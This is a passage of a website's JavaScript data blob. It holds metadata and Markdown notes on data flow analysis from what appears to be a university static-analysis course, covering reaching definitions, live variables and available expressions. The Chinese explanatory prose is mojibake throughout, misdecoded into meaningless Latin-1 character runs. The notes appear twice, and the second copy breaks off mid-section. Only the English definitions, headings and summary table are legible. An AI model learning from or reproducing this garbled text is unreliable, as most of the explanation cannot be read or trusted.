æ¡ä»¶çgotoï¼é£ä¹ä¸åºè¯¥æ·»è¾¹\n\n 4. æ·»å ç¨åºçæ­£çåºå£åå¥å£ï¼å¦ææå¤ä¸ªreturnï¼åå­å¨å¤ä¸ªexitã\n\n",charsets:{cjk:!0},lastUpdated:"2022/04/03, 12:13:15",lastUpdatedTimestamp:1648987995e3},{title:"SA - DFA-Applications",frontmatter:{title:"SA - DFA-Applications",date:"2022-02-11T00:00:00.000Z",permalink:"/sec/sa/nju/dfaapplications",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["éæåæ","åäº¬å¤§å­¦è¯¾ç¨ç¬è®°"],tags:["PL","SA","DFA"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/200.%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/2000.%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/02.DFA-Applications.html",relativePath:"02.å®å¨/200.éæåæ/2000.åäº¬å¤§å­¦è¯¾ç¨ç¬è®°/02.DFA-Applications.md",key:"v-73ef1b26",path:"/sec/sa/nju/dfaapplications/",headers:[{level:2,title:"Overview of Data Flow Analysis",slug:"overview-of-data-flow-analysis",normalizedTitle:"overview of data flow analysis",charIndex:25},{level:2,title:"of Data Flow Analysis",slug:"of-data-flow-analysis",normalizedTitle:"of data flow analysis",charIndex:34},{level:3,title:"Input and Output States",slug:"input-and-output-states",normalizedTitle:"input and output states",charIndex:883},{level:3,title:"Notations for Transfer Function Constraints",slug:"notations-for-transfer-function-constraints",normalizedTitle:"notations for transfer function constraints",charIndex:1394},{level:3,title:"Notations for Control Flow's Constraints",slug:"notations-for-control-flow-s-constraints",normalizedTitle:"notations for control flow's constraints",charIndex:1617},{level:2,title:"Reaching Definitions Analysis",slug:"reaching-definitions-analysis",normalizedTitle:"reaching definitions analysis",charIndex:1692},{level:3,title:"Abstraction",slug:"abstraction",normalizedTitle:"abstraction",charIndex:2151},{level:3,title:"Transfer Function",slug:"transfer-function",normalizedTitle:"transfer function",charIndex:1260},{level:3,title:"Control FLow",slug:"control-flow",normalizedTitle:"control flow",charIndex:2383},{level:3,title:"Algorithm of Reaching Definitions Analysis",slug:"algorithm-of-reaching-definitions-analysis",normalizedTitle:"algorithm of reaching definitions analysis",charIndex:2479},{level:3,title:"ä¸¾äºä¸ªæ å­",slug:"ä¸¾äºä¸ªæ å­",normalizedTitle:"ä¸¾äºä¸ªæ å­",charIndex:2792},{level:2,title:"Live Variables Analysis",slug:"live-variables-analysis",normalizedTitle:"live variables analysis",charIndex:3202},{level:3,title:"Abstraction",slug:"abstraction-2",normalizedTitle:"abstraction",charIndex:2151},{level:3,title:"Safe-approximation",slug:"safe-approximation",normalizedTitle:"safe-approximation",charIndex:695},{level:3,title:"ä¸¾ä¸ä¸ªæ å­",slug:"ä¸¾ä¸ä¸ªæ å­",normalizedTitle:"ä¸¾ä¸ä¸ªæ å­",charIndex:3965},{level:2,title:"Available Expressions Analysis",slug:"available-expressions-analysis",normalizedTitle:"available expressions analysis",charIndex:4024},{level:3,title:"Abstraction",slug:"abstraction-3",normalizedTitle:"abstraction",charIndex:2151},{level:3,title:"Safe-approximation",slug:"safe-approximation-2",normalizedTitle:"safe-approximation",charIndex:695},{level:3,title:"Algorithm",slug:"algorithm",normalizedTitle:"algorithm",charIndex:2479},{level:3,title:"ä¸¾äºä¸ªæ å­",slug:"ä¸¾äºä¸ªæ å­-2",normalizedTitle:"ä¸¾äºä¸ªæ å­",charIndex:2792},{level:2,title:"æ»ç»ä¸ç§ä¸åçData-Flow Analysis",slug:"æ»ç»ä¸ç§ä¸åçdata-flow-analysis",normalizedTitle:"æ»ç»ä¸ç§ä¸åçdata-flow analysis",charIndex:4726}],headersStr:"Overview of Data Flow Analysis of Data Flow Analysis Input and Output States Notations for Transfer Function Constraints Notations for Control Flow's Constraints Reaching Definitions Analysis Abstraction Transfer Function Control FLow Algorithm of Reaching Definitions Analysis ä¸¾äºä¸ªæ å­ Live Variables Analysis Abstraction Safe-approximation ä¸¾ä¸ä¸ªæ å­ Available Expressions Analysis Abstraction Safe-approximation Algorithm ä¸¾äºä¸ªæ å­ æ»ç»ä¸ç§ä¸åçData-Flow Analysis",content:'# DFA - Applications\n\n\n# Overview of Data Flow Analysis\n\nData Flow Analysisæä¹çè§£ï¼\n\n\n\nä»Introductionä¸­æä»¬å¯ä»¥ç¥éï¼éæåæå®éä¸å°±æ¯æ½è±¡ Abstract å è¿è¿ä¼¼Over-approximation çç»æãè¿ç§è¿è¿ä¼¼çéæåææ¹æ³å®éä¸æ¯å¤§å¤æ°éæåææéç¨çï¼æä»¬ç§°ä¹ä¸ºmay analysisï¼ä¸ä¹ç¸å¯¹è¿æä¸ä¸ªmust analysisãæè°çmay analysis,æçæ¯æä»¬çç»æå¯ä»¥æ¯çå®çï¼ä¹å¯ä»¥å­å¨ä¸äºéçå®çç»æï¼must analysisä½ä¸ºUnder-approximationçç»æï¼æçæ¯ææçè¾åºç»æå¿é¡»æ¯æ­£ç¡®çãä¸ç®¡æ¯may analysisè¿æ¯must analysisé½æ¯ä¸ºäºåæçå®å¨ï¼æ­£ç¡®ï¼ï¼äºæ¯å°±æsafe-approximationã\n\nå¨ç¬¬ä¸èè¯¾ä¸­ï¼æä»¬åæäºä¸ä¸ªè¡¨è¾¾å¼ä¸­çæ°æ®çç¬¦å·ï¼åä¸º + - 0 TOP BOTTOM ï¼è¿å°±æ¯å¯¹æ°æ®çæ½è±¡ï¼èå¯¹äºè¿ä¸ªæ å­èè¨æä»¬éç¨äºOver-approximationè¿è¿ä¼¼çæ¹æ³å¾åºäºä¸ä¸ªsoundçç»è®ºãæä»¬æå¾åºçè½¬æ¢å½æ°ï¼[[Introduction#Transfer functions|Transfer function]]) å®éä¸æ ¹æ®è¯­ä¹åæä»¬æåæçé®é¢å¾å°çåææ¹æ³ãä¾å¦ï¼TOP / 0 = BOTTOMãè[[Introduction#Control Flows|Control Flow Handling]]çä½ç°å°±æ¯å½æä»¬éå°äºä¸¤ä¸ªåæ¯åå¹¶ï¼å¯¹äºæä¸ä¸ªç¬¦å·çå¤çé®é¢ã\n\nSafe-approximationï¼ä¸ºäºåææç»ç»æçæ­£ç¡®ã\n\n * may analysis: safe = over\n * must analysis: safe = under\n\nä¸åçæ°æ®æµåææä¸åçæ°æ®æ½è±¡ï¼åæ¶ä¹æä¸åçsafe-approximationãå æ­¤ä¹å°±æäºä¸åçè½¬åå½æ°åæ§å¶æµå¤çã\n\n\n# of Data Flow Analysis\n\n\n# Input and Output States\n\nä½¿ç¨IN[s1]æ¥è¡¨ç¤ºç¨åºå¨æ§è¡S1è¯­å¥ä¹åçç¶æï¼ä½¿ç¨OUT[s1]è¡¨ç¤ºç¨åºå¨æ§è¡å®æS1ä¹åçç¶æãä¹å°±æ¯Input and output statesã\n\nç¨åºçç¶æIN/OUTç¶æåè¯­å¥ååçprogram pointç¸å³ã\n\n\n\nå¨æ¯ä¸ä¸ªæ°æ®æµåæä¸­ï¼æä»¬ç»æ¯ä¸ä¸ªç¨åºä¸­çç¹å³èä¸ä¸ªæ°æ®æµçå¼ï¼è¿ä¸ªå¼ä»£è¡¨äºç¨åºç¶æçä¸ä¸ªæ½è±¡ãèå¼åçæ¦å¿µå°±æ¯æä»¬ä¸é¢applicationçæææ½è±¡çæ°æ®æµå¼çéåãå¦ä¸å¾çæ å­æç¤ºï¼\n\n\n\nå®éä¸æ°æ®æµåæå°±æ¯ç»ç¨åºå½ä¸­çææè¯­å¥çINåOUTå»å³èä¸ä¸ªData-flow Valueçè¿ç¨ãè¿ä¸ªè¿ç¨éè¿è§£æä¸ç³»åçSafe-approximation-directed Constraints(çº¦æè§å)ï¼å»å¯»æ¾ä¸ä¸ªSolution ï¼èè¿äºçº¦æè§åæ¯åºäºTransfer FunctionåControl Flowçãä¹å°±æ¯è¯´æä»¬ä¸æ­çè§£è½¬æ¢å½æ°åæ§å¶å°±ä¿¡æ¯ççº¦æè§åï¼æç»ä¼å¾å°ä¸ä¸ªSolution ï¼è¿ä¸ªSolutionæç»ä¼ä¸ºæ¯ä¸ä¸ªè¯­å¥çIN/OUTå³èä¸ä¸ªData-flow Valueã ^f2f435\n\n\n# Notations for Transfer Function Constraints\n\nå¨ä¸è¬æåµä¸ï¼æ­£å¸¸çåæé½æ¯æç§ç¨åºæ­£å¸¸æ§è¡é¡ºåºè¿è¡æ§è¡çï¼ä¹å°±æ¯Froward Analysisã\n\nForward Analysisçæ°å­¦å®ä¹ä¸ºï¼OUT[s] = fs(IN[s])\n\né¤æ­¤ä¹å¤è¿æååçåææ¹å¼ï¼Backward Analysisã\n\nBackward Analysisçæ°å­¦å®ä¹ä¸ºï¼IN[s] = fs(OUT[s])\n\n\n\n\n# Notations for Control Flow\'s Constraints\n\nä¸é¢æ¯åä¸ªè¯­å¥ççº¦æè§åï¼èå¯¹äºBBçè¡¨ç¤ºè§åå¦ä¸ï¼\n\n\n\n\n# Reaching Definitions Analysis\n\nç°é¶æ®µä¸æ¶åä»¥ä¸çé®é¢ï¼\n\n * æ¹æ³è°ç¨\n   * å¼å¥çä½ç½®ï¼[[Inter-procedural Analysis]]\n * Aliases ä¸¤ä¸ªæ è¯ç¬¦æååä¸åå°åãå«å\n   * å¼å¥ä½ç½®ï¼[[Pointer Analysis]]\n\n> A definition d at program ponit p reaches a point q if there is a path from p to q such that d is not "killed" along that path.\n\nä¹å°±æ¯è¯´ï¼ä»ä¸ä¸ªåévçå®ä¹å¼å§ï¼å°æä¸ªç¨åºç¹pä¹é´å­å¨ä¸ä¸ªè·¯å¾ï¼å¹¶ä¸å¨è·¯å¾ä¹ä¸­ä¸å­å¨å¯¹äºvçéæ°å®ä¹ï¼è¿æ ·å°±æ¯ä¸ä¸ªreaching definitionsãå°è¾¾å®ä¹å¯ä»¥ç¨äºåæåéå¨ä½¿ç¨åæ¯å¦è¢«åå§åäºï¼ç»æ¯ä¸ä¸ªåéå¨CFGçå¥å£å¤è¿è¡åå§åä¸ä¸ªundefinedï¼å¦æåéè½å¤reachå°åéå©ç¨çå°æ¹ï¼é£ä¹è¯´æå­å¨åéæªåå§åçå©ç¨ã\n\n\n# Abstraction\n\nå¨è¿ä¸ªåæä¸­æä»¬å³æ³¨çæ°æ®æ¯definitionè½å¦å¯è¾¾æä¸ç¹ï¼å æ­¤æä»¬å°ææçdefinitionåæ½è±¡ãç¨bit verctorsè¡¨ç¤ºã\n\n\n\næ¥ä¸æ¥ä»ä¸¤æ¹é¢è¿è¡åæï¼\n\n\n# Transfer Function\n\nå¯¹äºè¯­å¥D: v = x op yèè¨å¨çæä¸ä¸ªvçåæ¶ï¼ä¹åçè¯­å¥ä¸­ä½¿ç¨çvé½æ¯å½åçæçvï¼å æ­¤è¦å é¤æå¯¹äºvçå¶ä»å®ä¹ï¼ä½æ¯å¯¹äºxï¼yç­å®ä¹å¨åç»­çè¯­å¥ä¸­ä»ç¶å¯ç¨ãæ°å­åè¡¨ç¤ºå¦ä¸ï¼\n\n\n\nä¸¾ä¸ªæ å­ï¼\n\n\n\n\n# Control FLow\n\nå¯¹äºControl Flowèè¨ï¼ç±äºæ¯ä¸ä¸ªmay analysisï¼æä»¥ä¸æ¾è¿ä»»æä¸æ¡pathãå°ææçåæ¯çç»æçè¾åºçå¹¶éé½ä½ä¸ºä¸ä¸ä¸ªBBçè¾å¥\n\n\n\n\n# Algorithm of Reaching Definitions Analysis\n\n\n\næç§è¯­ä¹çè§£ï¼å¨åæç¨åºä¹åï¼ENTRYçOUTå¿ç¶ä¸ºç©ºãå¶ä»çææBBå¨åæä¹åé½ä¸ºç©ºãä¸ºä»ä¹è¦åå¼åï¼å ä¸ºè¿ä¸ªç®æ³ä½ä¸ºä¸ä¸ªç®æ³æ¨¡æ¿ï¼å¯¹ææçData-Flow Analysisåºè¯¥é½ææï¼æå¯è½BBçOUTä¸ä¸ºç©ºçæåµï¼å æ­¤ENTRYçOUTä¸ºç©ºï¼å¶ä»çBBçOUTä¸ä¸ºç©ºãmay analysisçBB OUTä¸è¬ä¸ºç©ºï¼must analysisçBB OUTä¸è¬ä¸ºTOPãä¹åï¼å¦æå­å¨æä¸ªBBçOUTååäºåå¾ªç¯æ¯ä¸ªBBï¼ä½¿ç¨Control Flow analysisåTransfer Functionè¿è¡çº¦æã\n\n\n# ä¸¾äºä¸ªæ å­\n\n\n\nåå§åï¼\n\n\n\nç¬¬ä¸æ¬¡è¿­ä»£ï¼\n\n\n\nç±äºè¿­ä»£å®æä¹åï¼å­å¨å¤§äºç­äºä¸ä¸ªçBBçOUTååäºï¼å æ­¤è¿éè¦ç»§ç»­è¿­ä»£ã\n\n\n\nå®éä¸å¨è¿­ä»£ä¹ä¸­æä»¬å¯ä»¥åç°ï¼å¦æè¾å¥æ¯ä¸æ ·çï¼é£ä¹è¾åºä¹ä¸å®æ¯ä¸æ ·çãåºä¸ºkillæ¯æ°¸è¿åºå®çï¼generateä¹æ¯åºå®çãå¦æinä¹ç¸ååæ ¹æ®ï¼\n\n\n\nè¾åºä¹ä¸ä¼åã\n\næç»ç»è¿ä¸æ¬¡çéåç»æï¼æ²¡æBBçOUTåçäºååï¼äºæ¯ä¸è¦è¿è¡éåäºã\n\n\n\næç»å¾å°çç»æå°±æ¯Final Analysis Resultãäºæ¯æ ¹æ®ä¸é¢çæ å­ï¼æä»¬å¯ä»¥åæ¬¡åé¡¾ä¹åçå¯¹äºData FLow Analysisççè§£ã\n\n\n\nçè§£ä¸ä¸ï¼è¿ä¸ªç®æ³ä¸ºä»ä¹ä¼åï¼\n\nè¿ä¸ªç®æ³æå³é®çæ¯Transfer Functionï¼\n\n\n\né£æä»¬çå¾ªç¯æ¡ä»¶æ¯å®å¨çåï¼\n\n\n\nå°è¾¾ä¸ä¸ªä¸å¨ç¹ï¼å ä¸ºå½ææçè¾åºé½ä¸ååæ¶ï¼ä¸ä¸ä¸ªè¾åºæ¯ä¸ä¸ä¸ªè¾å¥ï¼è¾å¥ä¸ä¼åæå³çè¾åºä¹ä¸ä¼åï¼æä»¥æ è®ºå¾ªç¯å¤å°éé½ä¸ä¼åã\n\n\n# Live Variables Analysis\n\n> Live variables analysis tells whether the value of variable v at program point p could be used along some path in CFG starrting at p. If so, v is live at p; otherwise, v is dead at p.\n\nä»pç¹å¼å§å°ç»æçä¸æ¡è·¯å¾ä¸­ï¼æ¯ä¸æ¯æä¸ªå°æ¹ä½¿ç¨å°äºvãvæ³è¦liveï¼é£ä¹vå¨ä»på°ç»æçæ¶åä¸è½è¢«éæ°å®ä¹ãæä»¬å°±è¯´vå¨pç¹æ¯liveçãä¸ä¸ªå¸åçåºç¨åºæ¯æ¯å¯å­å¨çåéé®é¢ï¼å¯å­å¨å¦ææ»¡äºï¼é£ä¹å¯å­å¨ä¸­å­å¨çåªäºå¼å¯ä»¥ååºï¼æ¿æ¢ä¸ºä¸ä¸æ¡è¯­å¥çvçå¼ã\n\n\n\n\n# Abstraction\n\næä»¬å³æ³¨çæ¹æ³æ¯ææçvariablesã0è¡¨ç¤ºå¨pç¹æ¯deadçï¼1æ¯liveçã\n\n\n\n\n# Safe-approximation\n\né¦åç¡®å®ä¸ä¸ªé®é¢ï¼æä»¬æ¯ä½¿ç¨backwards analysisè¿æ¯ä½¿ç¨forwards analysisãè½ç¶æ²¡æåºå®çç­æ¡ï¼ä½æ¯æ¾ç¶backwards analysisæ´æ¹ä¾¿æä»¬è¿è¡åæãä»åå¾ååææ¶æä»¬åç°æä¸ªvariableè¢«useäºï¼åªéè¦ååå¯»æ¾å°å¶å®ä¹çpä½ç½®å³å¯ãèä½¿ç¨forwards analysisï¼æä»¬ä»på¼å§ï¼å°useçä½ç½®ï¼è¿éè¦è¿åå°pçä½ç½®ã\n\n\n\nè¿ä¸ªåä¸ä¸èçreaching Definition analysisç±»ä¼¼ï¼ä½æ¯ç±äºæ¯backward analysisï¼å æ­¤å¨åå§åçæ¶åä¼æä¸åãå¹¶ä¸ï¼å¨ä¸è¬æåµä¸ï¼may analysisä¸è¬åå§åä¸ºç©ºï¼must analysisä¸è¬åå§åä¸ºallãåé¢ä¹ä¼æ»ç»ã\n\n\n\n\n# ä¸¾ä¸ä¸ªæ å­\n\nåå§åæä½ï¼\n\n\n\nç¬¬ä¸æ¬¡éåï¼\n\n\n\néè¦ä¸ä¸æ¬¡éåï¼å ä¸ºIN[B]åçäºchangeï¼\n\n\n\n\n# Available Expressions Analysis\n\nè¿æ¯ä¸ä¸ªmust analysisã\n\n> An expression x op y is available at program point p if all paths from the entry to p must pass through the evaluation of x op y, and after the last evaluation of x op y, there is no redefinition of x or y.\n\nå¤§æ¦å°±æ¯è¯´ï¼ä¸ä¸ªè¡¨è¾¾å¼X OP Y å¨pç¹æ¯å¯ç¨çï¼é£ä¹ä»å¥å£å°pç¹çææçè·¯å¾ä¸­å¿é¡»é½æ§è¡è¿x op yï¼å¹¶ä¸å¨æåä¸æ¬¡æ§è¡å®x op yä¹åå°±æ²¡æå¯¹äºxæèyçéæ°å®ä¹äºãå¸åçå©ç¨åºæ¯å°±æ¯å¯¹x op y éå¤è®¡ç®çç»æçæ¿æ¢ã\n\n\n# Abstraction\n\n\n\n\n# Safe-approximation\n\nç±äºæ¯must analysisï¼æä»¬è¦èèçæ¯å¨å®éçåºç¨åºæ¯çsafeï¼ä¹å°±æ¯è¯´å¨è¿éï¼æä»¬æ³è±¡æå¯¹äºè¡¨è¾¾å¼ç»æçæ¿æ¢çåºæ¯ä¸­ï¼å¦æè¯´æä»¬è¯¯æ¥äºï¼å°ä¸ä¸ªæ¬æ¥æ¯ä¸è½è¢«æ¿æ¢çè¡¨è¾¾å¼çå¼æ¿æ¢æäºï¼é£ä¹å¯¹äºç¨åºæ¥è¯´å°±æ¯ä¸safeçäºãé£ä¹å¦ææ¯è¿è¡under-approximationçè¯ï¼æä»¬ä¹è®¸ä¼æ¼æ¥ä¸ä¸ªæ¬æ¥å¯ä»¥è¿è¡æ¿æ¢çå¼ï¼ä½è¿ä¸ä¼å¯¼è´ç¨åºä¸safeï¼ä»ä»åªæ¯å¨ç¨åºä¼åçæ¶åæ²¡æè¾¾å°æå¥½çææèå·²ã\n\n\n\n\n# Algorithm\n\n\n\n\n# ä¸¾äºä¸ªæ å­\n\nåå§åï¼\n\n\n\nç¬¬ä¸æ¬¡è¿­ä»£ï¼\n\n\n\nææçOUTé½åçäºååï¼æä»¥éè¦åä¸æ¬¡çè¿­ä»£ï¼\n\n\n\n\n# æ»ç»ä¸ç§ä¸åçData-Flow Analysis\n\n                    REACHING DEFINITIONS      LIVE VARIABLES   AVALIABLE EXPRESSION\nDomain              Definition                Variables        Expression\nDirection           Forwards                  Backwards        Forwards\nMay/Must            May                       May              Must\nBoundary            OUT entry = null          IN exit = null   OUT entry = null\nInitialization      OUT B = null              IN B = null      OUT B = all\nTransfer function   OUT = gen U (IN - kill)                    \nMeet                union                     union            and',normalizedContent:'# dfa - applications\n\n\n# overview of data flow analysis\n\ndata flow analysisæä¹çè§£ï¼\n\n\n\nä»introductionä¸­æä»¬å¯ä»¥ç¥éï¼éæåæå®éä¸å°±æ¯æ½è±¡ abstract å è¿è¿ä¼¼over-approximation çç»æãè¿ç§è¿è¿ä¼¼çéæåææ¹æ³å®éä¸æ¯å¤§å¤æ°éæåææéç¨çï¼æä»¬ç§°ä¹ä¸ºmay analysisï¼ä¸ä¹ç¸å¯¹è¿æä¸ä¸ªmust analysisãæè°çmay analysis,æçæ¯æä»¬çç»æå¯ä»¥æ¯çå®çï¼ä¹å¯ä»¥å­å¨ä¸äºéçå®çç»æï¼must analysisä½ä¸ºunder-approximationçç»æï¼æçæ¯ææçè¾åºç»æå¿é¡»æ¯æ­£ç¡®çãä¸ç®¡æ¯may analysisè¿æ¯must analysisé½æ¯ä¸ºäºåæçå®å¨ï¼æ­£ç¡®ï¼ï¼äºæ¯å°±æsafe-approximationã\n\nå¨ç¬¬ä¸èè¯¾ä¸­ï¼æä»¬åæäºä¸ä¸ªè¡¨è¾¾å¼ä¸­çæ°æ®çç¬¦å·ï¼åä¸º + - 0 top bottom ï¼è¿å°±æ¯å¯¹æ°æ®çæ½è±¡ï¼èå¯¹äºè¿ä¸ªæ å­èè¨æä»¬éç¨äºover-approximationè¿è¿ä¼¼çæ¹æ³å¾åºäºä¸ä¸ªsoundçç»è®ºãæä»¬æå¾åºçè½¬æ¢å½æ°ï¼[[introduction#transfer functions|transfer function]]) å®éä¸æ ¹æ®è¯­ä¹åæä»¬æåæçé®é¢å¾å°çåææ¹æ³ãä¾å¦ï¼top / 0 = bottomãè[[introduction#control flows|control flow handling]]çä½ç°å°±æ¯å½æä»¬éå°äºä¸¤ä¸ªåæ¯åå¹¶ï¼å¯¹äºæä¸ä¸ªç¬¦å·çå¤çé®é¢ã\n\nsafe-approximationï¼ä¸ºäºåææç»ç»æçæ­£ç¡®ã\n\n * may analysis: safe = over\n * must analysis: safe = under\n\nä¸åçæ°æ®æµåææä¸åçæ°æ®æ½è±¡ï¼åæ¶ä¹æä¸åçsafe-approximationãå æ­¤ä¹å°±æäºä¸åçè½¬åå½æ°åæ§å¶æµå¤çã\n\n\n# of data flow analysis\n\n\n# input and output states\n\nä½¿ç¨in[s1]æ¥è¡¨ç¤ºç¨åºå¨æ§è¡s1è¯­å¥ä¹åçç¶æï¼ä½¿ç¨out[s1]è¡¨ç¤ºç¨åºå¨æ§è¡å®æs1ä¹åçç¶æãä¹å°±æ¯input and output statesã\n\nç¨åºçç¶æin/outç¶æåè¯­å¥ååçprogram pointç¸å³ã\n\n\n\nå¨æ¯ä¸ä¸ªæ°æ®æµåæä¸­ï¼æä»¬ç»æ¯ä¸ä¸ªç¨åºä¸­çç¹å³èä¸ä¸ªæ°æ®æµçå¼ï¼è¿ä¸ªå¼ä»£è¡¨äºç¨åºç¶æçä¸ä¸ªæ½è±¡ãèå¼åçæ¦å¿µå°±æ¯æä»¬ä¸é¢applicationçæææ½è±¡çæ°æ®æµå¼çéåãå¦ä¸å¾çæ å­æç¤ºï¼\n\n\n\nå®éä¸æ°æ®æµåæå°±æ¯ç»ç¨åºå½ä¸­çææè¯­å¥çinåoutå»å³èä¸ä¸ªdata-flow valueçè¿ç¨ãè¿ä¸ªè¿ç¨éè¿è§£æä¸ç³»åçsafe-approximation-directed constraints(çº¦æè§å)ï¼å»å¯»æ¾ä¸ä¸ªsolution ï¼èè¿äºçº¦æè§åæ¯åºäºtransfer functionåcontrol flowçãä¹å°±æ¯è¯´æä»¬ä¸æ­çè§£è½¬æ¢å½æ°åæ§å¶å°±ä¿¡æ¯ççº¦æè§åï¼æç»ä¼å¾å°ä¸ä¸ªsolution ï¼è¿ä¸ªsolutionæç»ä¼ä¸ºæ¯ä¸ä¸ªè¯­å¥çin/outå³èä¸ä¸ªdata-flow valueã ^f2f435\n\n\n# notations for transfer function constraints\n\nå¨ä¸è¬æåµä¸ï¼æ­£å¸¸çåæé½æ¯æç§ç¨åºæ­£å¸¸æ§è¡é¡ºåºè¿è¡æ§è¡çï¼ä¹å°±æ¯froward analysisã\n\nforward analysisçæ°å­¦å®ä¹ä¸ºï¼out[s] = fs(in[s])\n\né¤æ­¤ä¹å¤è¿æååçåææ¹å¼ï¼backward analysisã\n\nbackward analysisçæ°å­¦å®ä¹ä¸ºï¼in[s] = fs(out[s])\n\n\n\n\n# notations for control flow\'s constraints\n\nä¸é¢æ¯åä¸ªè¯­å¥ççº¦æè§åï¼èå¯¹äºbbçè¡¨ç¤ºè§åå¦ä¸ï¼\n\n\n\n\n# reaching definitions analysis\n\nç°é¶æ®µä¸æ¶åä»¥ä¸çé®é¢ï¼\n\n * æ¹æ³è°ç¨\n   * å¼å¥çä½ç½®ï¼[[inter-procedural analysis]]\n * aliases ä¸¤ä¸ªæ è¯ç¬¦æååä¸åå°åãå«å\n   * å¼å¥ä½ç½®ï¼[[pointer analysis]]\n\n> a definition d at program ponit p reaches a point q if there is a path from p to q such that d is not "killed" along that path.\n\nä¹å°±æ¯è¯´ï¼ä»ä¸ä¸ªåévçå®ä¹å¼å§ï¼å°æä¸ªç¨åºç¹pä¹é´å­å¨ä¸ä¸ªè·¯å¾ï¼å¹¶ä¸å¨è·¯å¾ä¹ä¸­ä¸å­å¨å¯¹äºvçéæ°å®ä¹ï¼è¿æ ·å°±æ¯ä¸ä¸ªreaching definitionsãå°è¾¾å®ä¹å¯ä»¥ç¨äºåæåéå¨ä½¿ç¨åæ¯å¦è¢«åå§åäºï¼ç»æ¯ä¸ä¸ªåéå¨cfgçå¥å£å¤è¿è¡åå§åä¸ä¸ªundefinedï¼å¦æåéè½å¤reachå°åéå©ç¨çå°æ¹ï¼é£ä¹è¯´æå­å¨åéæªåå§åçå©ç¨ã\n\n\n# abstraction\n\nå¨è¿ä¸ªåæä¸­æä»¬å³æ³¨çæ°æ®æ¯definitionè½å¦å¯è¾¾æä¸ç¹ï¼å æ­¤æä»¬å°ææçdefinitionåæ½è±¡ãç¨bit verctorsè¡¨ç¤ºã\n\n\n\næ¥ä¸æ¥ä»ä¸¤æ¹é¢è¿è¡åæï¼\n\n\n# transfer function\n\nå¯¹äºè¯­å¥d: v = x op yèè¨å¨çæä¸ä¸ªvçåæ¶ï¼ä¹åçè¯­å¥ä¸­ä½¿ç¨çvé½æ¯å½åçæçvï¼å æ­¤è¦å é¤æå¯¹äºvçå¶ä»å®ä¹ï¼ä½æ¯å¯¹äºxï¼yç­å®ä¹å¨åç»­çè¯­å¥ä¸­ä»ç¶å¯ç¨ãæ°å­åè¡¨ç¤ºå¦ä¸ï¼\n\n\n\nä¸¾ä¸ªæ å­ï¼\n\n\n\n\n# control flow\n\nå¯¹äºcontrol flowèè¨ï¼ç±äºæ¯ä¸ä¸ªmay analysisï¼æä»¥ä¸æ¾è¿ä»»æä¸æ¡pathãå°ææçåæ¯çç»æçè¾åºçå¹¶éé½ä½ä¸ºä¸ä¸ä¸ªbbçè¾å¥\n\n\n\n\n# algorithm of reaching definitions analysis\n\n\n\næç§è¯­ä¹çè§£ï¼å¨åæç¨åºä¹åï¼entryçoutå¿ç¶ä¸ºç©ºãå¶ä»çææbbå¨åæä¹åé½ä¸ºç©ºãä¸ºä»ä¹è¦åå¼åï¼å ä¸ºè¿ä¸ªç®æ³ä½ä¸ºä¸ä¸ªç®æ³æ¨¡æ¿ï¼å¯¹ææçdata-flow analysisåºè¯¥é½ææï¼æå¯è½bbçoutä¸ä¸ºç©ºçæåµï¼å æ­¤entryçoutä¸ºç©ºï¼å¶ä»çbbçoutä¸ä¸ºç©ºãmay analysisçbb outä¸è¬ä¸ºç©ºï¼must analysisçbb outä¸è¬ä¸ºtopãä¹åï¼å¦æå­å¨æä¸ªbbçoutååäºåå¾ªç¯æ¯ä¸ªbbï¼ä½¿ç¨control flow analysisåtransfer functionè¿è¡çº¦æã\n\n\n# ä¸¾äºä¸ªæ å­\n\n\n\nåå§åï¼\n\n\n\nç¬¬ä¸æ¬¡è¿­ä»£ï¼\n\n\n\nç±äºè¿­ä»£å®æä¹åï¼å­å¨å¤§äºç­äºä¸ä¸ªçbbçoutååäºï¼å æ­¤è¿éè¦ç»§ç»­è¿­ä»£ã\n\n\n\nå®éä¸å¨è¿­ä»£ä¹ä¸­æä»¬å¯ä»¥åç°ï¼å¦æè¾å¥æ¯ä¸æ ·çï¼é£ä¹è¾åºä¹ä¸å®æ¯ä¸æ ·çãåºä¸ºkillæ¯æ°¸è¿åºå®çï¼generateä¹æ¯åºå®çãå¦æinä¹ç¸ååæ ¹æ®ï¼\n\n\n\nè¾åºä¹ä¸ä¼åã\n\næç»ç»è¿ä¸æ¬¡çéåç»æï¼æ²¡æbbçoutåçäºååï¼äºæ¯ä¸è¦è¿è¡éåäºã\n\n\n\næç»å¾å°çç»æå°±æ¯final analysis resultãäºæ¯æ ¹æ®ä¸é¢çæ å­ï¼æä»¬å¯ä»¥åæ¬¡åé¡¾ä¹åçå¯¹äºdata flow analysisççè§£ã\n\n\n\nçè§£ä¸ä¸ï¼è¿ä¸ªç®æ³ä¸ºä»ä¹ä¼åï¼\n\nè¿ä¸ªç®æ³æå³é®çæ¯transfer functionï¼\n\n\n\né£æä»¬çå¾ªç¯æ¡ä»¶æ¯å®å¨çåï¼\n\n\n\nå°è¾¾ä¸ä¸ªä¸å¨ç¹ï¼å ä¸ºå½ææçè¾åºé½ä¸ååæ¶ï¼ä¸ä¸ä¸ªè¾åºæ¯ä¸ä¸ä¸ªè¾å¥ï¼è¾å¥ä¸ä¼åæå³çè¾åºä¹ä¸ä¼åï¼æä»¥æ è®ºå¾ªç¯å¤å°éé½ä¸ä¼åã\n\n\n# live variables analysis\n\n> live variables analysis tells whether the value of variable v at program point p could be used along some path in cfg starrting at p. if so, v is live at p; otherwise, v is dead at p.\n\nä»pç¹å¼å§å°ç»æçä¸æ¡è·¯å¾ä¸­ï¼æ¯ä¸æ¯æä¸ªå°æ¹ä½¿ç¨å°äºvãvæ³è¦liveï¼é£ä¹vå¨ä»på°ç»æçæ¶åä¸è½è¢«éæ°å®ä¹ãæä»¬å°±è¯´vå¨pç¹æ¯liveçãä¸ä¸ªå¸åçåºç¨åºæ¯æ¯å¯å­å¨çåéé®é¢ï¼å¯å­å¨å¦ææ»¡äºï¼é£ä¹å¯å­å¨ä¸­å­å¨çåªäºå¼å¯ä»¥ååºï¼æ¿æ¢ä¸ºä¸ä¸æ¡è¯­å¥çvçå¼ã\n\n\n\n\n# abstraction\n\næä»¬å³æ³¨çæ¹æ³æ¯ææçvariablesã0è¡¨ç¤ºå¨pç¹æ¯deadçï¼1æ¯liveçã\n\n\n\n\n# 